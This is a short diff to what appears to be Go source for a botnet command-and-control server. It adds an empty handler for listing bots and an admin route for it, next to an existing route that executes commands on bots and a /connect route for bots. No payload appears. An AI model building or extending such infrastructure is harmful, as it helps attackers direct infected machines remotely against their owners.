@@ -160,14 +160,17 @@ func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-}
+} //send  execute command  message by admin
+func (c *c2) ListBots(w http.ResponseWriter, r *http.Request) {
 
+}
 func main() {
 	var wg sync.WaitGroup
 	wg.Add(2)
 	c2 := Newc2()
 	adminMux := http.NewServeMux()
 	adminMux.HandleFunc("/executeCommand", c2.SendCommand)
+	adminMux.HandleFunc("/listBots", c2.ListBots)
 
 	botMux := http.NewServeMux()
 	botMux.HandleFunc("/connect", c2.connectBot)
